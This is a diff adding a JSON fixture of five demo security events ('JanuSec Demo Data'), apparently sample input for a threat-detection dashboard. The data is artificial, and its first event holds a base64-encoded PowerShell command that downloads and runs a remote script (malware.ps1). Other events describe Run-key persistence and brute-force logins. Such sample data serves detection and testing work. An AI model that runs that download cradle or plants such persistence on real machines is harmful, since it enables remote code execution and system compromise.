@@ -1,0 +1,94 @@
+{
+  "demo_threat_events": [
+    {
+      "id": "demo-001",
+      "timestamp": "2025-09-29T13:45:00Z",
+      "event_type": "file_execution",
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAG0AYQBsAHcAYQByAGUALgBwAHMAMQAiACkA",
+      "parent_process": "cmd.exe",
+      "user": "SYSTEM",
+      "severity": "critical",
+      "mitre_techniques": ["T1059.001", "T1105"],
+      "threat_indicators": {
+        "encoded_command": true,
+        "web_download": true,
+        "system_account": true,
+        "suspicious_url": "192.168.1.100/malware.ps1"
+      }
+    },
+    {
+      "id": "demo-002",
+      "timestamp": "2025-09-29T13:44:30Z",
+      "event_type": "network_connection",
+      "src_ip": "10.0.0.15",
+      "dst_ip": "185.220.101.1",
+      "dst_port": 443,
+      "protocol": "TCP",
+      "process": "svchost.exe",
+      "severity": "high",
+      "mitre_techniques": ["T1071.001"],
+      "threat_indicators": {
+        "tor_exit_node": true,
+        "suspicious_process": true,
+        "encrypted_channel": true
+      }
+    },
+    {
+      "id": "demo-003",
+      "timestamp": "2025-09-29T13:43:15Z",
+      "event_type": "file_creation",
+      "file_path": "C:\\Windows\\Temp\\update.exe",
+      "file_size": 2048576,
+      "file_hash": "a7c24b7dc90e8a67f9c3b1d4e5f6789abcdef123456789",
+      "process": "winlogon.exe",
+      "severity": "medium",
+      "mitre_techniques": ["T1105", "T1036"],
+      "threat_indicators": {
+        "temp_directory": true,
+        "executable_file": true,
+        "system_process": true,
+        "suspicious_name": true
+      }
+    },
+    {
+      "id": "demo-004",
+      "timestamp": "2025-09-29T13:42:45Z",
+      "event_type": "registry_modification",
+      "registry_key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "registry_value": "UpdateService",
+      "registry_data": "C:\\Windows\\Temp\\update.exe",
+      "process": "regedit.exe",
+      "severity": "high",
+      "mitre_techniques": ["T1547.001"],
+      "threat_indicators": {
+        "autostart_registry": true,
+        "temp_executable": true,
+        "persistence_mechanism": true
+      }
+    },
+    {
+      "id": "demo-005",
+      "timestamp": "2025-09-29T13:41:20Z",
+      "event_type": "authentication_failure",
+      "username": "admin",
+      "source_ip": "192.168.1.200",
+      "target_system": "DC01.company.local",
+      "failure_count": 25,
+      "severity": "medium",
+      "mitre_techniques": ["T1110.001"],
+      "threat_indicators": {
+        "brute_force_attempt": true,
+        "privileged_account": true,
+        "multiple_failures": true
+      }
+    }
+  ],
+  "metadata": {
+    "collection_time": "2025-09-29T13:45:00Z",
+    "source": "JanuSec Demo Data",
+    "total_events": 5,
+    "threat_score": 85,
+    "confidence": 0.92
+  }
+}
